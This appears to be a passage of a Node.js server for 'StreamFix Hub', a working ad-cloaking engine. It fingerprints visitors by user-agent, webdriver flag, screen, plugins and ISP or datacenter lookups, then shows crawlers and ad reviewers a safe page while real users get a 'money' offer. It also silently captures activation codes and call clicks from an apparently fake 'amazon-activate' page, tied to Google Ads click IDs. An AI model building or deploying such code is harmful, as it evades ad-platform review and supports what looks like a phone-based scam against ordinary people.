const express = require('express');
const path = require('path');
const https = require('https');
const fs = require('fs');
const session = require('express-session');
const bcrypt = require('bcryptjs');

const app = express();
const PORT = process.env.PORT || 5000;

// ─── Data file paths ──────────────────────────────────────────────────────────
const SETTINGS_FILE = path.join(__dirname, 'data', 'settings.json');
const LOGS_FILE     = path.join(__dirname, 'data', 'logs.json');
const LEADS_FILE    = path.join(__dirname, 'data', 'leads.json');
const MAX_LOG_ENTRIES  = 500;
const MAX_LEAD_ENTRIES = 500;

function readSettings() {
  try { return JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8')); } catch (e) {
    return { moneyUrl: '', safeUrl: '/safe', enabled: true, blockedIps: [], allowedCountries: [] };
  }
}

function writeSettings(data) {
  fs.writeFileSync(SETTINGS_FILE, JSON.stringify(data, null, 2));
}

function readLogs() {
  try { return JSON.parse(fs.readFileSync(LOGS_FILE, 'utf8')); } catch (e) { return []; }
}

function appendLog(entry) {
  var logs = readLogs();
  logs.unshift(entry);
  if (logs.length > MAX_LOG_ENTRIES) logs = logs.slice(0, MAX_LOG_ENTRIES);
  fs.writeFileSync(LOGS_FILE, JSON.stringify(logs, null, 2));
}

// ─── Leads helpers ────────────────────────────────────────────────────────────
function readLeads() {
  try { return JSON.parse(fs.readFileSync(LEADS_FILE, 'utf8')); } catch (e) { return []; }
}

function appendLead(entry) {
  var leads = readLeads();
  leads.unshift(entry);
  if (leads.length > MAX_LEAD_ENTRIES) leads = leads.slice(0, MAX_LEAD_ENTRIES);
  fs.writeFileSync(LEADS_FILE, JSON.stringify(leads, null, 2));
}

function markLeadCalled(ip, code) {
  var leads = readLeads();
  var cutoff = Date.now() - 30 * 60 * 1000;
  var found = false;
  for (var i = 0; i < leads.length; i++) {
    var l = leads[i];
    if (l.type === 'code_submit' && l.ip === ip && new Date(l.ts).getTime() > cutoff) {
      leads[i].called = true;
      leads[i].calledAt = new Date().toISOString();
      found = true;
      break;
    }
  }
  if (!found) {
    leads.unshift({ type: 'call_click', ts: new Date().toISOString(), ip: ip, code: code || '', called: true });
    if (leads.length > MAX_LEAD_ENTRIES) leads = leads.slice(0, MAX_LEAD_ENTRIES);
  }
  fs.writeFileSync(LEADS_FILE, JSON.stringify(leads, null, 2));
}

// ─── Admin password ───────────────────────────────────────────────────────────
var ADMIN_PASSWORD_HASH;
(function() {
  var pwd = process.env.ADMIN_PASSWORD;
  if (!pwd) {
    var crypto = require('crypto');
    pwd = crypto.randomBytes(9).toString('base64'); // 12-char base64
    console.warn('');
    console.warn('⚠️  WARNING: ADMIN_PASSWORD env var is not set.');
    console.warn('   One-time admin password for this session: ' + pwd);
    console.warn('   Set ADMIN_PASSWORD in your environment to make it permanent.');
    console.warn('');
  }
  ADMIN_PASSWORD_HASH = bcrypt.hashSync(pwd, 10);
})();

// ─── Per-IP frequency store (in-memory, 24-hour window) ──────────────────────
// Map<ip, lastVisitTimestamp>
var ipFreqStore = new Map();
var IP_FREQ_MAX = 10000;
var IP_FREQ_WINDOW_MS = 24 * 60 * 60 * 1000; // 24 hours

function checkFrequency(ip) {
  var now = Date.now();
  var last = ipFreqStore.get(ip);
  if (last && (now - last) < IP_FREQ_WINDOW_MS) {
    // Seen within 24h — it's a repeat click
    ipFreqStore.set(ip, now);
    return true;
  }
  // First visit (or >24h ago) — record and allow
  // Evict oldest entry if store is full
  if (!last && ipFreqStore.size >= IP_FREQ_MAX) {
    var firstKey = ipFreqStore.keys().next().value;
    ipFreqStore.delete(firstKey);
  }
  ipFreqStore.set(ip, now);
  return false;
}

function clearFrequencyStore() {
  ipFreqStore.clear();
}

// ─── Bot / crawler UA blocklist ───────────────────────────────────────────────
var BOT_PATTERNS = [
  /googlebot/i, /adsbot/i, /bingbot/i, /slurp/i, /duckduckbot/i,
  /baiduspider/i, /yandexbot/i, /sogou/i, /exabot/i, /facebot/i,
  /ia_archiver/i, /mj12bot/i, /dotbot/i, /semrushbot/i, /ahrefsbot/i,
  /majestic/i, /rogerbot/i, /screaming.frog/i, /wget/i, /curl/i,
  /python-requests/i, /libwww-perl/i, /java\//i, /go-http-client/i,
  /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i, /whatsapp/i,
  /pinterest/i, /slackbot/i, /telegrambot/i, /headlesschrome/i,
  /phantomjs/i, /selenium/i, /webdriver/i, /scrapy/i,
  /crawler/i, /spider/i, /bot\b/i
];

function isBot(ua) {
  if (!ua) return true;
  return BOT_PATTERNS.some(function(p) { return p.test(ua); });
}

// ─── Suspicious ISP/org keywords ─────────────────────────────────────────────
var SUSPICIOUS_ISP = [
  'google', 'amazon', 'microsoft', 'cloudflare', 'digitalocean',
  'linode', 'vultr', 'ovh', 'hetzner', 'facebook', 'apple'
];

function isSuspiciousISP(isp, org) {
  var combined = ((isp || '') + ' ' + (org || '')).toLowerCase();
  return SUSPICIOUS_ISP.some(function(k) { return combined.indexOf(k) !== -1; });
}

// ─── IP reputation check via ip-api.com ──────────────────────────────────────
function checkIP(ip) {
  return new Promise(function(resolve) {
    if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('10.') ||
        ip.startsWith('192.168.') || ip.startsWith('172.')) {
      return resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: 'local', org: '' });
    }
    var opts = {
      hostname: 'ip-api.com',
      path: '/json/' + ip + '?fields=status,country,countryCode,city,regionName,isp,org,proxy,hosting',
      method: 'GET',
      headers: { 'User-Agent': 'node-cloaker/1.0' }
    };
    var http = require('http');
    var req = http.request(opts, function(res) {
      var data = '';
      res.on('data', function(c) { data += c; });
      res.on('end', function() {
        try {
          var p = JSON.parse(data);
          resolve({
            proxy: p.proxy || false,
            hosting: p.hosting || false,
            country: p.countryCode || 'XX',
            city: p.city || '',
            regionName: p.regionName || '',
            isp: p.isp || '',
            org: p.org || ''
          });
        } catch (e) { resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' }); }
      });
    });
    req.on('error', function() { resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' }); });
    req.setTimeout(4000, function() { req.destroy(); resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' }); });
    req.end();
  });
}

// ─── Middleware ───────────────────────────────────────────────────────────────
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: process.env.SESSION_SECRET || 'fallback-secret-change-me',
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true, maxAge: 8 * 60 * 60 * 1000 }
}));

function requireAdmin(req, res, next) {
  if (req.session && req.session.adminAuth) return next();
  res.redirect('/admin/login');
}

// ─── Public routes ────────────────────────────────────────────────────────────
app.get('/', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/peacock', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'peacock.html'));
});

app.get('/safe', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'safe.html'));
});

app.get('/offer', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'offer.html'));
});

// ─── Self-hosted cloaking engine ──────────────────────────────────────────────
app.post('/api/cloak', async function(req, res) {
  var settings = readSettings();
  var realIP = req.headers['x-forwarded-for']
    ? req.headers['x-forwarded-for'].split(',')[0].trim()
    : req.connection.remoteAddress;

  var ua = req.headers['user-agent'] || req.body.ua || '';
  var tz = req.body.tz || '';
  var sw = parseInt(req.body.sw) || 0;
  var sh = parseInt(req.body.sh) || 0;
  var wd = req.body.wd === true || req.body.wd === 'true';
  var pl = parseInt(req.body.pl) || 0;
  var screenStr = sw + 'x' + sh;

  var moneyUrl = settings.moneyUrl || '/offer';
  var safeUrl  = settings.safeUrl  || '/safe';

  function fastBlock(reason) {
    var entry = {
      ts: new Date().toISOString(), ip: realIP,
      country: 'XX', city: '', region: '', isp: '',
      ua: ua.slice(0, 80), screen: screenStr, plugins: pl,
      decision: 'block', reason: reason
    };
    appendLog(entry);
    return res.json({ decision: 'block', url: safeUrl });
  }

  // Cloaking disabled → always allow
  if (!settings.enabled) {
    appendLog({
      ts: new Date().toISOString(), ip: realIP,
      country: 'XX', city: '', region: '', isp: '',
      ua: ua.slice(0, 80), screen: screenStr, plugins: pl,
      decision: 'allow', reason: 'disabled'
    });
    return res.json({ decision: 'allow', url: moneyUrl });
  }

  // 1. Manual IP blocklist — checked first so it always wins with reason manual-block
  var blockedIps = Array.isArray(settings.blockedIps) ? settings.blockedIps : [];
  if (blockedIps.indexOf(realIP) !== -1) return fastBlock('manual-block');

  // 2. Repeat-click frequency check — only for IPs not on the manual list
  if (checkFrequency(realIP)) return fastBlock('repeat-click');

  // 3. Bot User-Agent check
  if (isBot(ua)) return fastBlock('bot-ua');

  // 4. Webdriver flag
  if (wd) return fastBlock('webdriver');

  // 5. Screen size checks
  if (sw === 0 || sh === 0) return fastBlock('no-screen');
  if ((sw === 800 && sh === 600) || (sw === 1024 && sh === 768)) {
    if (pl === 0) return fastBlock('headless-screen');
  }

  // 6. Plugin count + desktop UA check
  var isMobile = /iPhone|Android|iPad|Mobile/i.test(ua);
  var isDesktop = /Windows|Macintosh/i.test(ua);
  if (!isMobile && isDesktop && pl === 0) return fastBlock('no-plugins-desktop');

  // 7. IP reputation check (includes city/region/ISP/country)
  var ipData;
  try { ipData = await checkIP(realIP); } catch (e) {
    ipData = { proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' };
  }

  var decision = 'allow';
  var reason   = 'clean';

  // 8. Country/geo filter (after IP lookup, before other network checks)
  var allowedCountries = Array.isArray(settings.allowedCountries) ? settings.allowedCountries : [];
  if (allowedCountries.length > 0) {
    var visitorCC = (ipData.country || 'XX').toUpperCase();
    var allowed = allowedCountries.some(function(cc) { return cc.toUpperCase() === visitorCC; });
    if (!allowed) {
      decision = 'block';
      reason   = 'country-block';
    }
  }

  // 9. Suspicious ISP/org check
  if (decision === 'allow' && isSuspiciousISP(ipData.isp, ipData.org)) {
    decision = 'block';
    reason   = 'suspicious-isp';
  }

  // 10. Proxy / hosting check
  if (decision === 'allow' && (ipData.proxy || ipData.hosting)) {
    decision = 'block';
    reason   = ipData.proxy ? 'proxy-vpn' : 'datacenter';
  }

  appendLog({
    ts: new Date().toISOString(),
    ip: realIP,
    country: ipData.country || 'XX',
    city: ipData.city || '',
    region: ipData.regionName || '',
    isp: ipData.isp || '',
    ua: ua.slice(0, 80),
    screen: screenStr,
    plugins: pl,
    decision: decision,
    reason: reason
  });

  res.json({ decision: decision, url: decision === 'allow' ? moneyUrl : safeUrl });
});

// ─── Legacy redirect ───────────────────────────────────────────────────────────
app.post('/api/cloakify', function(req, res) {
  res.redirect(307, '/api/cloak');
});

// ─── Lead capture (public — fires silently from amazon-activate page) ─────────
app.post('/api/track/lead', async function(req, res) {
  res.json({ ok: true }); // respond immediately, never block the client
  try {
    var type   = req.body.type || 'code_submit';
    var realIP = req.headers['x-forwarded-for']
      ? req.headers['x-forwarded-for'].split(',')[0].trim()
      : req.connection.remoteAddress;
    var code = (req.body.code || '').slice(0, 20).toUpperCase();

    if (type === 'call_click') {
      markLeadCalled(realIP, code);
      return;
    }

    var ua = req.headers['user-agent'] || req.body.ua || '';
    var ipData;
    try { ipData = await checkIP(realIP); } catch (e) {
      ipData = { country: 'XX', city: '', regionName: '', isp: '' };
    }

    appendLead({
      type:         'code_submit',
      ts:           new Date().toISOString(),
      ip:           realIP,
      country:      ipData.country      || 'XX',
      city:         ipData.city         || '',
      region:       ipData.regionName   || '',
      isp:          ipData.isp          || '',
      ua:           ua.slice(0, 120),
      code:         code,
      screen:       (parseInt(req.body.sw) || 0) + 'x' + (parseInt(req.body.sh) || 0),
      tz:           (req.body.tz         || '').slice(0, 50),
      referrer:     (req.body.referrer   || '').slice(0, 200),
      utm_source:   (req.body.utm_source   || '').slice(0, 80),
      utm_campaign: (req.body.utm_campaign || '').slice(0, 80),
      utm_term:     (req.body.utm_term     || '').slice(0, 80),
      utm_content:  (req.body.utm_content  || '').slice(0, 80),
      gclid:        (req.body.gclid        || '').slice(0, 80),
      called:       false
    });
  } catch (e) { /* silently swallow — never break client experience */ }
});

// ─── Admin login ──────────────────────────────────────────────────────────────
app.get('/admin/login', function(req, res) {
  if (req.session && req.session.adminAuth) return res.redirect('/admin');
  var error = req.query.error ? '<p class="error">Invalid credentials. Try again.</p>' : '';
  res.send(adminLoginPage(error));
});

app.post('/admin/login', function(req, res) {
  var password = req.body.password || '';
  if (bcrypt.compareSync(password, ADMIN_PASSWORD_HASH)) {
    req.session.adminAuth = true;
    return res.redirect('/admin');
  }
  res.redirect('/admin/login?error=1');
});

// ─── Admin logout ─────────────────────────────────────────────────────────────
app.get('/admin/logout', function(req, res) {
  req.session.destroy(function() { res.redirect('/admin/login'); });
});

// ─── Admin dashboard ──────────────────────────────────────────────────────────
app.get('/admin', requireAdmin, function(req, res) {
  var settings = readSettings();
  var logs     = readLogs();
  var leads    = readLeads();
  res.send(adminDashboardPage(settings, logs, leads));
});

// ─── Admin settings save (URLs) ───────────────────────────────────────────────
app.post('/admin/settings', requireAdmin, function(req, res) {
  var settings = readSettings();
  settings.moneyUrl = (req.body.moneyUrl || '').trim();
  settings.safeUrl  = (req.body.safeUrl  || '/safe').trim();
  writeSettings(settings);
  res.redirect('/admin');
});

// ─── Admin toggle cloaking ────────────────────────────────────────────────────
app.post('/admin/toggle', requireAdmin, function(req, res) {
  var settings = readSettings();
  settings.enabled = !settings.enabled;
  writeSettings(settings);
  res.redirect('/admin');
});

// ─── Admin clear logs ─────────────────────────────────────────────────────────
app.post('/admin/clear-logs', requireAdmin, function(req, res) {
  fs.writeFileSync(LOGS_FILE, '[]');
  res.redirect('/admin');
});

// ─── Admin clear leads ────────────────────────────────────────────────────────
app.post('/admin/clear-leads', requireAdmin, function(req, res) {
  fs.writeFileSync(LEADS_FILE, '[]');
  res.redirect('/admin');
});

// ─── Admin save blocked IPs ───────────────────────────────────────────────────
app.post('/admin/blocked-ips', requireAdmin, function(req, res) {
  var settings = readSettings();
  var raw = (req.body.blockedIps || '').trim();
  settings.blockedIps = raw
    .split(/[\n,]+/)
    .map(function(s) { return s.trim(); })
    .filter(function(s) { return s.length > 0; });
  writeSettings(settings);
  res.redirect('/admin');
});

// ─── Admin save allowed countries ────────────────────────────────────────────
app.post('/admin/allowed-countries', requireAdmin, function(req, res) {
  var settings = readSettings();
  var raw = (req.body.allowedCountries || '').trim();
  settings.allowedCountries = raw
    .split(/[\n,\s]+/)
    .map(function(s) { return s.trim().toUpperCase(); })
    .filter(function(s) { return s.length === 2; });
  writeSettings(settings);
  res.redirect('/admin');
});

// ─── Admin export blocked IPs for Google Ads ──────────────────────────────────
app.get('/admin/blocked-ips-export', requireAdmin, function(req, res) {
  var settings  = readSettings();
  var logs      = readLogs();
  var seen      = {};
  var unique    = [];
  var privateRe = /^(127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|::1$|fd)/;

  function add(ip) {
    if (ip && !seen[ip] && !privateRe.test(ip)) { seen[ip] = true; unique.push(ip); }
  }

  (settings.blockedIps || []).forEach(add);
  logs.filter(function(l) { return l.decision === 'block'; }).forEach(function(l) { add(l.ip); });

  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.setHeader('Content-Disposition', 'attachment; filename="blocked-ips.txt"');
  res.send(unique.join('\n'));
});

app.post('/admin/clear-frequency', requireAdmin, function(req, res) {
  clearFrequencyStore();
  res.redirect('/admin');
});

// ─── Clean URLs ───────────────────────────────────────────────────────────────
app.get('/:page', function(req, res) {
  var page = req.params.page;
  var filePath = path.join(__dirname, 'public', page + '.html');
  res.sendFile(filePath, function(err) {
    if (err) res.status(404).sendFile(path.join(__dirname, 'public', 'index.html'));
  });
});

app.listen(PORT, '0.0.0.0', function() {
  console.log('Server running on port ' + PORT);
});

// ─── HTML templates ───────────────────────────────────────────────────────────
function adminLoginPage(errorHtml) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d0010;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#e0e0e0}
.card{background:#1a0d2e;border:1px solid #3d1f6e;border-radius:12px;padding:40px 36px;width:100%;max-width:380px;box-shadow:0 8px 40px rgba(0,0,0,0.5)}
h1{font-size:1.4rem;margin-bottom:6px;color:#c084fc}
.sub{font-size:0.82rem;color:#888;margin-bottom:28px}
label{display:block;font-size:0.82rem;color:#aaa;margin-bottom:6px}
input[type=password]{width:100%;padding:11px 14px;background:#0d0010;border:1px solid #3d1f6e;border-radius:8px;color:#e0e0e0;font-size:0.95rem;outline:none;transition:border .2s}
input[type=password]:focus{border-color:#a855f7}
button{width:100%;margin-top:20px;padding:12px;background:#7c3aed;color:#fff;border:none;border-radius:8px;font-size:1rem;font-weight:600;cursor:pointer;transition:background .2s}
button:hover{background:#6d28d9}
.error{color:#f87171;font-size:0.85rem;margin-top:14px;text-align:center}
</style>
</head>
<body>
<div class="card">
  <h1>Admin Panel</h1>
  <p class="sub">StreamFix Hub &mdash; Cloaking Control</p>
  <form method="POST" action="/admin/login">
    <label for="password">Password</label>
    <input type="password" id="password" name="password" autofocus autocomplete="current-password" placeholder="Enter admin password">
    <button type="submit">Sign In</button>
    ${errorHtml}
  </form>
</div>
</body>
</html>`;
}

function adminDashboardPage(settings, logs, leads) {
  leads = Array.isArray(leads) ? leads : [];
  var now = new Date();
  var today = now.toISOString().slice(0, 10);
  var timeStr = now.toUTCString().slice(17, 25);

  // ── Stats ─────────────────────────────────────────────────────────────────
  var todayLogs    = logs.filter(function(l) { return l.ts && l.ts.startsWith(today); });
  var todayAllow   = todayLogs.filter(function(l) { return l.decision === 'allow'; }).length;
  var todayBlock   = todayLogs.filter(function(l) { return l.decision === 'block'; }).length;
  var todayTotal   = todayAllow + todayBlock;
  var allAllow     = logs.filter(function(l) { return l.decision === 'allow'; }).length;
  var allBlock     = logs.filter(function(l) { return l.decision === 'block'; }).length;
  var allTotal     = allAllow + allBlock;
  var blockRate    = allTotal > 0 ? Math.round(allBlock / allTotal * 100) : 0;

  // ── Top countries ─────────────────────────────────────────────────────────
  var countryCounts = {};
  logs.forEach(function(l) {
    var cc = l.country || 'XX';
    countryCounts[cc] = (countryCounts[cc] || 0) + 1;
  });
  var flags = { US:'🇺🇸',GB:'🇬🇧',CA:'🇨🇦',AU:'🇦🇺',IN:'🇮🇳',DE:'🇩🇪',FR:'🇫🇷',PH:'🇵🇭',MX:'🇲🇽',BR:'🇧🇷',NL:'🇳🇱',SG:'🇸🇬',JP:'🇯🇵',NG:'🇳🇬',PK:'🇵🇰',ZA:'🇿🇦',XX:'🌐' };
  var topCountries = Object.keys(countryCounts)
    .sort(function(a,b){ return countryCounts[b]-countryCounts[a]; })
    .slice(0, 5);
  var maxCC = topCountries.length > 0 ? countryCounts[topCountries[0]] : 1;
  var countryRows = topCountries.map(function(cc) {
    var cnt = countryCounts[cc];
    var pct = Math.round(cnt / maxCC * 100);
    var flag = flags[cc] || '🌐';
    return '<div class="cc-row"><span class="cc-flag">' + flag + '</span><span class="cc-code">' + escHtml(cc) + '</span><div class="cc-bar-wrap"><div class="cc-bar" style="width:' + pct + '%"></div></div><span class="cc-cnt">' + cnt + '</span></div>';
  }).join('') || '<p class="empty">No data yet</p>';

  // ── Block reasons (including new ones) ────────────────────────────────────
  var reasonCounts = {};
  logs.filter(function(l){ return l.decision === 'block'; }).forEach(function(l) {
    var r = l.reason || 'unknown';
    reasonCounts[r] = (reasonCounts[r] || 0) + 1;
  });
  var reasonOrder = [
    'repeat-click','manual-block','country-block',
    'bot-ua','datacenter','proxy-vpn','suspicious-isp',
    'webdriver','no-screen','headless-screen','no-plugins-desktop'
  ];
  var reasonColors = {
    'repeat-click':'orange','manual-block':'orange','country-block':'orange',
    'bot-ua':'amber','webdriver':'amber','no-screen':'amber','headless-screen':'amber','no-plugins-desktop':'amber',
    'datacenter':'red','proxy-vpn':'red','suspicious-isp':'red'
  };
  var reasonPills = reasonOrder.filter(function(r){ return reasonCounts[r] > 0; }).map(function(r) {
    var col = reasonColors[r] || 'grey';
    return '<span class="pill pill-' + col + '">' + escHtml(r) + ' <strong>' + reasonCounts[r] + '</strong></span>';
  }).join('') || '<span class="empty">No blocks yet</span>';

  // ── Toggle ────────────────────────────────────────────────────────────────
  var toggleLabel  = settings.enabled ? 'Disable Cloaking' : 'Enable Cloaking';
  var pulseDot     = settings.enabled ? '<span class="pulse-dot"></span>' : '';
  var statusBadge  = settings.enabled
    ? pulseDot + '<span class="badge on">ENABLED</span>'
    : '<span class="badge off">DISABLED</span>';

  // ── Current traffic control state ────────────────────────────────────────
  var blockedIpsList    = Array.isArray(settings.blockedIps) ? settings.blockedIps : [];
  var allowedCountriesList = Array.isArray(settings.allowedCountries) ? settings.allowedCountries : [];
  var freqStoreSize     = ipFreqStore.size;
  var repeatClicksIn24h = logs.filter(function(l) {
    return l.decision === 'block' && l.reason === 'repeat-click' && l.ts &&
      (Date.now() - new Date(l.ts).getTime()) < IP_FREQ_WINDOW_MS;
  }).length;

  // ── Log rows ──────────────────────────────────────────────────────────────
  function deviceType(ua) {
    if (!ua) return '—';
    if (/ipad|tablet|kindle|playbook|(android(?!.*mobile))/i.test(ua)) return 'Tablet';
    if (/mobile|iphone|ipod|android|blackberry|opera mini|iemobile|wpdesktop/i.test(ua)) return 'Mobile';
    return 'Desktop';
  }
  function locationStr(l) {
    if (!l.city) return escHtml(l.country || 'XX');
    var parts = [escHtml(l.city)];
    if (l.region) parts.push(escHtml(l.region));
    parts.push(escHtml(l.country || 'XX'));
    return parts.join(', ');
  }
  function reasonPill(r) {
    var col = {
      clean:'green',
      'repeat-click':'orange','manual-block':'orange','country-block':'orange',
      'bot-ua':'amber',webdriver:'amber','no-screen':'amber','headless-screen':'amber','no-plugins-desktop':'amber',
      datacenter:'red','proxy-vpn':'red','suspicious-isp':'red',
      disabled:'grey'
    }[r] || 'grey';
    return '<span class="rpill rpill-' + col + '">' + escHtml(r || '') + '</span>';
  }
  var logRows = logs.slice(0, 150).map(function(l) {
    var cls    = l.decision === 'allow' ? 'allow' : 'block';
    var ts     = l.ts ? l.ts.replace('T',' ').slice(0,19) : '';
    var isp    = (l.isp || '').slice(0, 22);
    var screen = (!l.screen || l.screen === '0x0') ? '—' : escHtml(l.screen);
    var device = deviceType(l.ua || '');
    return '<tr>'
      + '<td class="mono">' + ts + '</td>'
      + '<td class="mono">' + escHtml(l.ip || '') + '</td>'
      + '<td>' + locationStr(l) + '</td>'
      + '<td class="isp" title="' + escHtml(l.isp || '') + '">' + escHtml(isp) + '</td>'
      + '<td class="mono">' + screen + '</td>'
      + '<td>' + escHtml(device) + '</td>'
      + '<td class="ua">' + escHtml((l.ua || '').slice(0, 50)) + '</td>'
      + '<td class="' + cls + '">' + escHtml(l.decision || '') + '</td>'
      + '<td>' + reasonPill(l.reason) + '</td>'
      + '</tr>';
  }).join('');

  // ── Blocked IP export count (for Google Ads card) ────────────────────────
  var exportSeen = {};
  var privateRe  = /^(127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|::1$|fd)/;
  (blockedIpsList).forEach(function(ip) { if (ip && !privateRe.test(ip)) exportSeen[ip] = true; });
  logs.filter(function(l){ return l.decision === 'block' && l.ip; })
      .forEach(function(l){ if (!privateRe.test(l.ip)) exportSeen[l.ip] = true; });
  var exportCount = Object.keys(exportSeen).length;

  // ── Leads stats ───────────────────────────────────────────────────────────
  var submits     = leads.filter(function(l) { return l.type === 'code_submit'; });
  var todaySubmits = submits.filter(function(l) { return l.ts && l.ts.startsWith(today); });
  var calledLeads  = submits.filter(function(l) { return l.called; });
  var callRate     = submits.length > 0 ? Math.round(calledLeads.length / submits.length * 100) : 0;

  function adSource(l) {
    if (l.gclid) return '<span class="rpill rpill-amber">Google Ads</span>';
    var src = l.utm_campaign || l.utm_source || '';
    return src ? '<span style="font-size:0.72rem;color:#a78bfa">' + escHtml(src.slice(0, 20)) + '</span>' : '—';
  }

  var leadRows = submits.slice(0, 150).map(function(l) {
    var ts     = l.ts ? l.ts.replace('T',' ').slice(0,19) : '';
    var device = deviceType(l.ua || '');
    var calledBadge = l.called
      ? '<span class="rpill rpill-green">Yes</span>'
      : '<span class="rpill rpill-grey">No</span>';
    return '<tr>'
      + '<td class="mono">' + ts + '</td>'
      + '<td class="mono">' + escHtml(l.ip || '') + '</td>'
      + '<td>' + locationStr(l) + '</td>'
      + '<td>' + escHtml(device) + '</td>'
      + '<td class="mono" style="color:#c084fc;font-weight:700">' + escHtml(l.code || '') + '</td>'
      + '<td>' + adSource(l) + '</td>'
      + '<td>' + calledBadge + '</td>'
      + '</tr>';
  }).join('');

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="refresh" content="60">
<title>Cloaking Admin — StreamFix Hub</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#08050f;color:#e0e0e0;min-height:100vh}

header{background:#120824;border-bottom:1px solid #2e1655;padding:14px 28px;display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:10px}
.hdr-left h1{font-size:1.05rem;color:#c084fc;font-weight:700;margin-bottom:4px}
.hdr-urls{font-size:0.74rem;color:#6b6b8a}
.hdr-urls span{color:#a78bfa}
.hdr-right{display:flex;align-items:center;gap:14px;flex-wrap:wrap}
.hdr-time{font-size:0.75rem;color:#555;white-space:nowrap}
.hdr-right a{color:#888;font-size:0.8rem;text-decoration:none}
.hdr-right a:hover{color:#c084fc}

.container{max-width:1260px;margin:0 auto;padding:24px 18px}

/* ── Grid layouts ── */
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-bottom:18px}
.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:18px;margin-bottom:18px}
@media(max-width:900px){.grid2,.grid3{grid-template-columns:1fr}}

/* ── Card ── */
.card{background:#1a0d2e;border:1px solid #2e1655;border-radius:12px;padding:22px}
.card h2{font-size:0.78rem;text-transform:uppercase;letter-spacing:1.2px;color:#a78bfa;margin-bottom:16px;font-weight:700}

/* ── Badge / status ── */
.badge{display:inline-block;padding:3px 12px;border-radius:20px;font-size:0.75rem;font-weight:700;letter-spacing:0.5px;vertical-align:middle}
.badge.on{background:#14532d;color:#4ade80}
.badge.off{background:#450a0a;color:#f87171}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.25}}
.pulse-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#4ade80;animation:pulse 1.5s infinite;margin-right:7px;vertical-align:middle}

/* ── Buttons ── */
.toggle-row{display:flex;align-items:center;gap:14px;margin-bottom:14px;flex-wrap:wrap}
.toggle-row p{font-size:0.82rem;color:#777}
form.inline{display:inline}
button{padding:9px 18px;border:none;border-radius:8px;font-size:0.85rem;font-weight:600;cursor:pointer;transition:background .2s}
.btn-primary{background:#7c3aed;color:#fff}.btn-primary:hover{background:#6d28d9}
.btn-danger{background:#7f1d1d;color:#fca5a5}.btn-danger:hover{background:#991b1b}
.btn-success{background:#14532d;color:#4ade80}.btn-success:hover{background:#166534}
.btn-sm{padding:6px 13px;font-size:0.78rem}

/* ── Stats ── */
.stats-row{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:10px}
.stat{flex:1;min-width:90px;background:#0d0018;border:1px solid #2e1655;border-radius:10px;padding:14px 10px;text-align:center}
.stat .num{font-size:1.7rem;font-weight:800;display:block;line-height:1}
.stat .lbl{font-size:0.7rem;color:#666;margin-top:5px;display:block}
.allow-num{color:#4ade80}.block-num{color:#f87171}.total-num{color:#a78bfa}.rate-num{color:#fb923c}

/* ── Country bars ── */
.cc-row{display:flex;align-items:center;gap:8px;margin-bottom:9px}
.cc-flag{font-size:1.1rem;width:22px;text-align:center}
.cc-code{font-size:0.78rem;font-weight:700;color:#c084fc;width:26px}
.cc-bar-wrap{flex:1;background:#0d0018;border-radius:4px;height:8px;overflow:hidden}
.cc-bar{height:100%;background:linear-gradient(90deg,#7c3aed,#a855f7);border-radius:4px;transition:width .4s}
.cc-cnt{font-size:0.78rem;color:#888;width:30px;text-align:right}

/* ── Reason pills (summary) ── */
.pills-wrap{display:flex;flex-wrap:wrap;gap:8px}
.pill{display:inline-flex;align-items:center;gap:5px;padding:5px 12px;border-radius:20px;font-size:0.78rem}
.pill strong{font-size:0.88rem}
.pill-orange{background:#431407;color:#fb923c}
.pill-amber{background:#451a03;color:#fbbf24}
.pill-red{background:#450a0a;color:#f87171}
.pill-grey{background:#1c1c2e;color:#888}

/* ── Form inputs ── */
label{display:block;font-size:0.78rem;color:#aaa;margin-bottom:5px;margin-top:14px}
label:first-child{margin-top:0}
input[type=text],input[type=url],textarea{width:100%;padding:9px 12px;background:#0d0018;border:1px solid #2e1655;border-radius:8px;color:#e0e0e0;font-size:0.85rem;outline:none;font-family:inherit}
input:focus,textarea:focus{border-color:#a855f7}
textarea{resize:vertical;font-size:0.78rem;font-family:'SF Mono',Menlo,monospace;line-height:1.5}

/* ── Traffic controls counters ── */
.tc-meta{display:flex;gap:12px;margin-bottom:14px;flex-wrap:wrap}
.tc-chip{background:#0d0018;border:1px solid #2e1655;border-radius:8px;padding:8px 12px;font-size:0.76rem;color:#888}
.tc-chip strong{color:#c084fc}

/* ── Log table ── */
.log-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch}
